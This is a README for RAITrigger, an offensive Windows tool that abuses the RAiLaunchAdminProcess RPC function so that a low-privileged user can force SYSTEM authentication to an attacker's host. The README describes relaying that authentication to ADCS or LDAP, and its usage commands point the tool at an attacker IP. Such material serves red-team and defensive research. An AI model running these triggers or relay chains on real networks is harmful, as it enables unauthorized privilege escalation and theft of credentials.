# RAITrigger

The RPC-function `RAiLaunchAdminProcess` from the `appinfo.dll` library was in the past already used for [UAC bypass](https://googleprojectzero.blogspot.com/2019/12/) purposes.

It turns out, that this function can be called from any low privileged user (not to spawn a process) but to trigger SYSTEM authentication to an arbitrary location. This is because `CreateFileW` is called as SYSTEM to the first input parameter's location:

<br>
<div align="center">
    <img src="https://github.com/rtecCyberSec/RAITrigger/blob/main/SystemTrigger.png?raw=true" width="500">
</div>
<br>

As the low privileged user is still impersonated, this cannot be used as Potato trigger to elevate Privileges from `SEImpersonate` to SYSTEM:

<br>
<div align="center">
    <img src="https://github.com/rtecCyberSec/RAITrigger/blob/main/Impersonation.png?raw=true" width="500">
</div>
<br>

But it can be used to request a computer account certificate against ADCS when web enrollment is enabled with the incoming SMB authentication. Or it can be used for LPE with relaying to LDAP - when LDAP Signing is not enabled.

To Trigger SMB authentication:
```bash
[*] RAITrigger.exe \\attackerip\test\test.exe
```

To Trigger HTTP authentication (WebClient service needs to be enabled):
```bash
[*] RAITrigger.exe \\hostname@80\test\test.exe
```

HTTP authentication is only triggered to trusted intranet zone systems, so you will need to create an ADIDNS record for your Kali IP or be in the same subnet and use e.G. Responder. Never use the full FQDN, only the hostname.

Calling this function from remote (even with local administrator) leads to `rpc_access_denied` so this is no alternative to e.G. PetitPotam or similar:

<br>
<div align="center">
    <img src="https://github.com/rtecCyberSec/RAITrigger/blob/main/Denied.png?raw=true" width="500">
</div>
<br>


## Room for improvement

- The NtApiDotNet library is huge. Using MIDL bytes can drastically reduce the assembly size similar to [SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers/)
